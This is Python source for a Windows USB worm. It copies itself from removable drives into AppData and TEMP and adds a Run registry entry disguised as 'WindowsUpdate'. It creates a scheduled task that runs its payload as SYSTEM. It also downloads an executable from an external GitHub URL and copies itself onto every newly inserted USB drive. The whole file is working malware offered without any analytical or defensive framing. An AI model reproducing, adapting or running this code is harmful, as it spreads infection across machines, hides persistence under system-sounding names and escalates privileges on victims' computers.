import os
import shutil
import subprocess
import winreg
import psutil
import time
import requests

PAYLOAD_PATH = os.path.join(os.getenv('TEMP'), 'init.exe')
SYSTEM_PATH = os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Templates\worm.py')
TASK_NAME = "SystemUpdateTask"
FLAG_FILE = r"C:\Windows\Temp\1572754491.txt"

def is_usb_drive(path):
    drive = os.path.splitdrive(path)[0]
    for partition in psutil.disk_partitions():
        if partition.device == drive:
            return 'removable' in partition.opts
    return False

def add_to_run(key_name, path):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, path)
        winreg.CloseKey(key)
    except PermissionError:
        pass  # Requires admin privileges

def check_payload():
    init_link = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/init.exe"
    if not os.path.exists(PAYLOAD_PATH):
        try:
            response = requests.get(init_link)
            if response.status_code == 200:
                with open(PAYLOAD_PATH, "wb") as f:
                    f.write(response.content)
        except: pass

def create_scheduled_task():
    """Create a one-time scheduled task to run the payload with SYSTEM privileges."""
    if not os.path.exists(FLAG_FILE):
        command = f'schtasks /create /tn {TASK_NAME} /tr "{PAYLOAD_PATH}" /sc once /ru SYSTEM /rl HIGHEST /f'
        subprocess.run(command, shell=True)
        subprocess.run(f'schtasks /run /tn {TASK_NAME}', shell=True)

def monitor_usb_drives():
    """Monitor for new USB drives and copy the worm to them."""
    known_drives = set(p.mountpoint for p in psutil.disk_partitions() if 'removable' in p.opts)
    while True:
        check_payload()
        current_drives = set(p.mountpoint for p in psutil.disk_partitions() if 'removable' in p.opts)
        new_drives = current_drives - known_drives
        for drive in new_drives:
            shutil.copy(__file__, os.path.join(drive, 'worm.py'))
        known_drives = current_drives
        time.sleep(5)

def main():
    if is_usb_drive(__file__):
        # Running from USB: copy to system, set persistence, create task
        shutil.copy(__file__, SYSTEM_PATH)
        shutil.copy(__file__, PAYLOAD_PATH) 
        add_to_run("WindowsUpdate", SYSTEM_PATH)
        create_scheduled_task()
    else:
        # Running from system: monitor USB drives for spreading
        monitor_usb_drives()

if __name__ == "__main__":
    main()